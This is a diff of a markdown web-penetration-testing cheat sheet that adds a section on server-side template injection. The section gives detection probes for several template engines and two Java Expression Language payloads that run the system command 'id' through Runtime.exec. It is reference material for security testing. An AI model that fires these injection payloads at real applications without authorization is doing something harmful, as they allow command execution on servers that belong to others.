@@ -1,7 +1,6 @@
 # Tricks - Web Penetration Tester
 
 - [x] In Construction... (60%)
-
 ## WAF
 
 ### Manual Detection:
@@ -550,3 +549,32 @@ https://book.hacktricks.xyz/pentesting-web/nosql-injection
 ## Graphql Introspection
 
 https://ivangoncharov.github.io/graphql-voyager/
+  
+### SSTI
+
+#### Identify
+
+jinja2 or twig
+{{3*3}}
+
+smarty or mako
+{3*3}
+
+ERB(Ruby)
+<%= 7*7 %>
+
+others
+${3*3}
+${{3*3}}
+#{3*3}
+3*3
+
+#### Doc for SSTI	
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+#### Java Expression Language
+
+{{T(java.lang.Runtime).getRuntime().exec('id')}}
+
+''.class.forName('java.lang.Runtime').getRuntime().exec('id')
